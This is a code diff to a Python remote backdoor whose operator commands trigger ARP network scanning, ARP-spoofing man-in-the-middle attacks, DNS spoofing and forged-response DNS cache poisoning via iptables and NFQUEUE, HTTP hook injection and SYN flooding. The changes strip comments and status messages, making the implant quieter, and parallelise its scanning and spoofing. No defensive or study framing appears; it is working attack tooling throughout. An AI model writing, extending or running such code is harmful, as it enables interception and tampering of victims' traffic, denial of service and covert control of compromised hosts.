@@ -45,17 +45,17 @@ def write_file(path, content):
         return "[+] Upload successful."
 
 
-# function that returns a list with responses from a broadcast
 def broadcast(ip):
     arp_request = scapy.ARP(pdst=ip)
     brdcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = brdcast / arp_request
-
-    # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
     return scapy.srp(arp_request_broadcast, timeout=2, retry=3, verbose=False)[0]
 
 
-# function that scans network IPs
+def scan(scan_ip, network_results):
+    network_results.append([ip[1].psrc for ip in broadcast(scan_ip)])
+
+
 def network_scanner():
     route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
     network, i = "0.0.0.0", 0
@@ -63,32 +63,37 @@ def network_scanner():
         network, netmask, machine_ip = route[4 + i * 4], route[5 + i * 4], route[7 + i * 4]
         i += 1
     if network and netmask:
-        print('Network: {}'.format(network))
-        print('Netmask: {}'.format(netmask))
-        print("Machine's IP: {}".format(machine_ip))
         try:
             cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
             scan_ip = network + '/' + str(cidr)
+            manager = multiprocessing.Manager()
+            network_results = manager.list()
             final = []
+            p_processes = []
+
             for _ in range(0, 5):
-                temp = [ip[1].psrc for ip in broadcast(scan_ip)]
+                p = multiprocessing.Process(target=scan, args=(scan_ip, network_results))
+                p.start()
+                p_processes.append(p)
+            for process in p_processes:
+                process.join()
+
+            for temp in network_results:
                 if len(temp) > len(final):
                     final = temp
-            print('[+] Network scan complete.')
+
             try:
                 final.remove(machine_ip)
             except ValueError:
                 pass
+
             return final
         except ValueError:
-            print("[!] Something went wrong. Scan failed.")
             return
     else:
-        print("[-] Could not read Network or Subnet Mask. Scan failed.")
         return
 
 
-# function that returns MAC address of selected IP
 def get_mac(ip):
     answered_mac = broadcast(ip)
     try:
@@ -97,14 +102,12 @@ def get_mac(ip):
         pass
 
 
-# function that spoofs IPs
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 
-# function that restores the communication of two devices
 def restore(dst_ip, src_ip):
     dst_mac = get_mac(dst_ip)
     src_mac = get_mac(src_ip)
@@ -112,16 +115,13 @@ def restore(dst_ip, src_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-# function that resets ARP tables and restores original connections
 def cleanup(targets, src):
     for target_ip in targets:
         if target_ip != router_ip:
             restore(target_ip, src)
             restore(src, target_ip)
-    print("[+] Done!")
 
 
-# function that creates a Man in the Middle
 def arp_spoof(targets, src):
     if SYS_PLATFORM == 'linux':
         try:
@@ -134,13 +134,11 @@ def arp_spoof(targets, src):
                         spoof(src, target_ip)
                 sleep(2)
         except:
-            print("[!] Something went wrong ... Resetting ARP Tables...")
             cleanup(targets, src)
             with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                 f.write("0")
 
 
-# function that modifies DNS layer packets
 def process_packet_dns(packet, target_website, modified_ip):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
@@ -152,14 +150,16 @@ def process_packet_dns(packet, target_website, modified_ip):
 
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].chksum
-            del scapy_packet[scapy.UDP].len
+            try:
+                del scapy_packet[scapy.UDP].chksum
+                del scapy_packet[scapy.UDP].len
+            except IndexError:
+                pass
 
             packet.set_payload(bytes(scapy_packet))
     packet.accept()
 
 
-# function that modifies HTTP layer packets
 def process_packet_hook(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
@@ -185,7 +185,6 @@ def process_packet_hook(packet):
     packet.accept()
 
 
-# function that spoofs a DNS response
 def dns_spoof(target_website, modified_ip):
     subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
     queue = netfilterqueue.NetfilterQueue()
@@ -196,12 +195,9 @@ def dns_spoof(target_website, modified_ip):
     try:
         queue.run()
     except:
-        print("[!] Something went wrong ... FlUSHING IPTABLES...")
         subprocess.run(["iptables", "--flush"])
-        print("[+] Done.")
 
 
-# function that injects a hook
 def hook():
     subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
     queue = netfilterqueue.NetfilterQueue()
@@ -209,29 +205,19 @@ def hook():
     try:
         queue.run()
     except:
-        print("[!] Something went wrong ... FlUSHING IPTABLES...")
         subprocess.run(["iptables", "--flush"])
-        print("[+] Done.")
 
 
 def kill_dns():
     if dns_process.is_alive():
         dns_process.terminate()
-        print("[!] Dns process terminated ... FlUSHING IPTABLES...")
         subprocess.run(["iptables", "--flush"])
-        print("[+] Done.")
-    else:
-        print('[-] No dns spoof running at the moment.')
 
 
 def kill_hook():
     if hook_process.is_alive():
         hook_process.terminate()
-        print("[!] Hook process terminated ... FlUSHING IPTABLES...")
         subprocess.run(["iptables", "--flush"])
-        print("[+] Done.")
-    else:
-        print('[-] No Hook Injector running at the moment.')
 
 
 def kill_arp():
@@ -245,13 +231,10 @@ def kill_arp():
         except:
             pass
         arp_process.terminate()
-        print("[!] Arp process terminated ... Resetting ARP Tables...")
         cleanup(selected, router_ip)
         if SYS_PLATFORM == 'linux':
             with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                 f.write("0")
-    else:
-        print('[-] No arp spoof running at the moment.')
 
 
 def randomize_ip():
@@ -364,7 +347,6 @@ class Backdoor:
         except:
             self.connected.value = False
 
-    # function that sends json objects through socket connection
     def reliable_send(self, data):
         try:
             json_data = json.dumps(data.decode('utf-8')).encode('utf-8')
@@ -374,7 +356,6 @@ class Backdoor:
             json_data = json.dumps(data).encode('utf-8')
         self.connection.send(json_data)
 
-    # function that receives json objects through socket connection
     def reliable_receive(self):
         json_data = "".encode('utf-8')
         while True:
@@ -399,15 +380,11 @@ class Backdoor:
                         try:
                             scan_result = network_scanner()
                             if scan_result:
-                                if router_ip:
-                                    global selected
-                                    global arp_process
-                                    selected = scan_result
-                                    arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, router_ip))
-                                    print("[+] Initializing Arp Spoof...")
-                                    arp_process.start()
-                                else:
-                                    print("[-] Router IP not found. Choose manually..")
+                                global selected
+                                global arp_process
+                                selected = scan_result
+                                arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, router_ip))
+                                arp_process.start()
                         except:
                             pass
                     elif command[0] == 'dnsspoof':
@@ -426,12 +403,9 @@ class Backdoor:
                                 global dns_process
                                 dns_process = multiprocessing.Process(target=dns_spoof,
                                                                       args=(target_website, modified_ip))
-                                print("[+] Initializing Dns Spoof...")
                                 dns_process.start()
-                            else:
-                                print('[-] No arp spoof running at the moment.')
                         except:
-                            print('[-] No arp spoof running at the moment.')
+                            pass
                     elif command[0] == 'hook':
                         try:
                             kill_hook()
@@ -445,12 +419,9 @@ class Backdoor:
                                     pass
                                 global hook_process
                                 hook_process = multiprocessing.Process(target=hook)
-                                print("[+] Initializing Hook Injector...")
                                 hook_process.start()
-                            else:
-                                print('[-] No arp spoof running at the moment.')
                         except NameError:
-                            print('[-] No arp spoof running at the moment.')
+                            pass
                     elif command[0] == "synflood":
                         try:
                             flood_ip = command[1]
@@ -489,8 +460,6 @@ class Backdoor:
                             if end > 65535:
                                 end = 65535
                             dnsQids = list(range(start, end+1))
-                            print(start)
-                            print(end)
                             badAddr = "10.0.2.10"
 
                             ip = scapy.IP(src=nsAddr, dst=dnsAddr)
@@ -503,7 +472,8 @@ class Backdoor:
                             total_responses = manager.list()
                             for port in dnsPorts:
                                 p = multiprocessing.Process(target=fake_dns_responses,
-                                                            args=(port, dnsQids, qdsec, ansec, nssec, ip, total_responses))
+                                                            args=(port, dnsQids, qdsec, ansec,
+                                                                  nssec, ip, total_responses))
                                 p.start()
                                 p_processes.append(p)
                             for process in p_processes:
@@ -526,17 +496,13 @@ class Backdoor:
                                                             args=(port, port_responses[1], dnsAddr, rawsock))
                                 sending_fake_responses_processes.append(p)
 
-                            print("Sending requests..")
                             sending_requests.start()
-                            print("Sending fake responses..")
                             for process in sending_fake_responses_processes:
                                 process.start()
 
                             sending_requests.join()
-                            print("Done sending requests")
                             for process in sending_fake_responses_processes:
                                 process.join()
-                            print("Done sending fake responses")
                         except:
                             pass
                     elif command[0] == "killarp":
